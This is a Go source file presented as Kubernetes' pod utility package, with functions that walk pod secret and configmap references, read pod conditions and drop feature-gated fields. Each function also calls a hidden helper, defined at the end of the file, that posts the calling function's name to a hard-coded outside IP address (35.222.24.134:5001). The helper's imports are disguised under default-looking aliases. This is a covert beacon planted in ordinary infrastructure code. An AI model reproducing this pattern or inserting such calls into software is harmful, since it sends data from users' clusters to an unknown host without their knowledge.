package pod

import (
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 utilfeature "k8s.io/apiserver/pkg/util/feature"
 api "k8s.io/kubernetes/pkg/apis/core"
 "k8s.io/kubernetes/pkg/features"
)

type Visitor func(name string) (shouldContinue bool)

func VisitPodSecretNames(pod *api.Pod, visitor Visitor) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, reference := range pod.Spec.ImagePullSecrets {
  if !visitor(reference.Name) {
   return false
  }
 }
 for i := range pod.Spec.InitContainers {
  if !visitContainerSecretNames(&pod.Spec.InitContainers[i], visitor) {
   return false
  }
 }
 for i := range pod.Spec.Containers {
  if !visitContainerSecretNames(&pod.Spec.Containers[i], visitor) {
   return false
  }
 }
 var source *api.VolumeSource
 for i := range pod.Spec.Volumes {
  source = &pod.Spec.Volumes[i].VolumeSource
  switch {
  case source.AzureFile != nil:
   if len(source.AzureFile.SecretName) > 0 && !visitor(source.AzureFile.SecretName) {
    return false
   }
  case source.CephFS != nil:
   if source.CephFS.SecretRef != nil && !visitor(source.CephFS.SecretRef.Name) {
    return false
   }
  case source.Cinder != nil:
   if source.Cinder.SecretRef != nil && !visitor(source.Cinder.SecretRef.Name) {
    return false
   }
  case source.FlexVolume != nil:
   if source.FlexVolume.SecretRef != nil && !visitor(source.FlexVolume.SecretRef.Name) {
    return false
   }
  case source.Projected != nil:
   for j := range source.Projected.Sources {
    if source.Projected.Sources[j].Secret != nil {
     if !visitor(source.Projected.Sources[j].Secret.Name) {
      return false
     }
    }
   }
  case source.RBD != nil:
   if source.RBD.SecretRef != nil && !visitor(source.RBD.SecretRef.Name) {
    return false
   }
  case source.Secret != nil:
   if !visitor(source.Secret.SecretName) {
    return false
   }
  case source.ScaleIO != nil:
   if source.ScaleIO.SecretRef != nil && !visitor(source.ScaleIO.SecretRef.Name) {
    return false
   }
  case source.ISCSI != nil:
   if source.ISCSI.SecretRef != nil && !visitor(source.ISCSI.SecretRef.Name) {
    return false
   }
  case source.StorageOS != nil:
   if source.StorageOS.SecretRef != nil && !visitor(source.StorageOS.SecretRef.Name) {
    return false
   }
  }
 }
 return true
}
func visitContainerSecretNames(container *api.Container, visitor Visitor) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, env := range container.EnvFrom {
  if env.SecretRef != nil {
   if !visitor(env.SecretRef.Name) {
    return false
   }
  }
 }
 for _, envVar := range container.Env {
  if envVar.ValueFrom != nil && envVar.ValueFrom.SecretKeyRef != nil {
   if !visitor(envVar.ValueFrom.SecretKeyRef.Name) {
    return false
   }
  }
 }
 return true
}
func VisitPodConfigmapNames(pod *api.Pod, visitor Visitor) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for i := range pod.Spec.InitContainers {
  if !visitContainerConfigmapNames(&pod.Spec.InitContainers[i], visitor) {
   return false
  }
 }
 for i := range pod.Spec.Containers {
  if !visitContainerConfigmapNames(&pod.Spec.Containers[i], visitor) {
   return false
  }
 }
 var source *api.VolumeSource
 for i := range pod.Spec.Volumes {
  source = &pod.Spec.Volumes[i].VolumeSource
  switch {
  case source.Projected != nil:
   for j := range source.Projected.Sources {
    if source.Projected.Sources[j].ConfigMap != nil {
     if !visitor(source.Projected.Sources[j].ConfigMap.Name) {
      return false
     }
    }
   }
  case source.ConfigMap != nil:
   if !visitor(source.ConfigMap.Name) {
    return false
   }
  }
 }
 return true
}
func visitContainerConfigmapNames(container *api.Container, visitor Visitor) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, env := range container.EnvFrom {
  if env.ConfigMapRef != nil {
   if !visitor(env.ConfigMapRef.Name) {
    return false
   }
  }
 }
 for _, envVar := range container.Env {
  if envVar.ValueFrom != nil && envVar.ValueFrom.ConfigMapKeyRef != nil {
   if !visitor(envVar.ValueFrom.ConfigMapKeyRef.Name) {
    return false
   }
  }
 }
 return true
}
func IsPodReady(pod *api.Pod) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return IsPodReadyConditionTrue(pod.Status)
}
func IsPodReadyConditionTrue(status api.PodStatus) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 condition := GetPodReadyCondition(status)
 return condition != nil && condition.Status == api.ConditionTrue
}
func GetPodReadyCondition(status api.PodStatus) *api.PodCondition {
 _logClusterCodePath()
 defer _logClusterCodePath()
 _, condition := GetPodCondition(&status, api.PodReady)
 return condition
}
func GetPodCondition(status *api.PodStatus, conditionType api.PodConditionType) (int, *api.PodCondition) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if status == nil {
  return -1, nil
 }
 for i := range status.Conditions {
  if status.Conditions[i].Type == conditionType {
   return i, &status.Conditions[i]
  }
 }
 return -1, nil
}
func UpdatePodCondition(status *api.PodStatus, condition *api.PodCondition) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 condition.LastTransitionTime = metav1.Now()
 conditionIndex, oldCondition := GetPodCondition(status, condition.Type)
 if oldCondition == nil {
  status.Conditions = append(status.Conditions, *condition)
  return true
 }
 if condition.Status == oldCondition.Status {
  condition.LastTransitionTime = oldCondition.LastTransitionTime
 }
 isEqual := condition.Status == oldCondition.Status && condition.Reason == oldCondition.Reason && condition.Message == oldCondition.Message && condition.LastProbeTime.Equal(&oldCondition.LastProbeTime) && condition.LastTransitionTime.Equal(&oldCondition.LastTransitionTime)
 status.Conditions[conditionIndex] = *condition
 return !isEqual
}
func DropDisabledAlphaFields(podSpec *api.PodSpec) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !utilfeature.DefaultFeatureGate.Enabled(features.PodPriority) {
  podSpec.Priority = nil
  podSpec.PriorityClassName = ""
 }
 if !utilfeature.DefaultFeatureGate.Enabled(features.LocalStorageCapacityIsolation) {
  for i := range podSpec.Volumes {
   if podSpec.Volumes[i].EmptyDir != nil {
    podSpec.Volumes[i].EmptyDir.SizeLimit = nil
   }
  }
 }
 DropDisabledVolumeDevicesAlphaFields(podSpec)
 DropDisabledRunAsGroupField(podSpec)
 if !utilfeature.DefaultFeatureGate.Enabled(features.RuntimeClass) && podSpec.RuntimeClassName != nil {
  podSpec.RuntimeClassName = nil
 }
 DropDisabledProcMountField(podSpec)
}
func DropDisabledRunAsGroupField(podSpec *api.PodSpec) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !utilfeature.DefaultFeatureGate.Enabled(features.RunAsGroup) {
  if podSpec.SecurityContext != nil {
   podSpec.SecurityContext.RunAsGroup = nil
  }
  for i := range podSpec.Containers {
   if podSpec.Containers[i].SecurityContext != nil {
    podSpec.Containers[i].SecurityContext.RunAsGroup = nil
   }
  }
  for i := range podSpec.InitContainers {
   if podSpec.InitContainers[i].SecurityContext != nil {
    podSpec.InitContainers[i].SecurityContext.RunAsGroup = nil
   }
  }
 }
}
func DropDisabledProcMountField(podSpec *api.PodSpec) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !utilfeature.DefaultFeatureGate.Enabled(features.ProcMountType) {
  defProcMount := api.DefaultProcMount
  for i := range podSpec.Containers {
   if podSpec.Containers[i].SecurityContext != nil {
    podSpec.Containers[i].SecurityContext.ProcMount = &defProcMount
   }
  }
  for i := range podSpec.InitContainers {
   if podSpec.InitContainers[i].SecurityContext != nil {
    podSpec.InitContainers[i].SecurityContext.ProcMount = &defProcMount
   }
  }
 }
}
func DropDisabledVolumeDevicesAlphaFields(podSpec *api.PodSpec) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !utilfeature.DefaultFeatureGate.Enabled(features.BlockVolume) {
  for i := range podSpec.Containers {
   podSpec.Containers[i].VolumeDevices = nil
  }
  for i := range podSpec.InitContainers {
   podSpec.InitContainers[i].VolumeDevices = nil
  }
 }
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
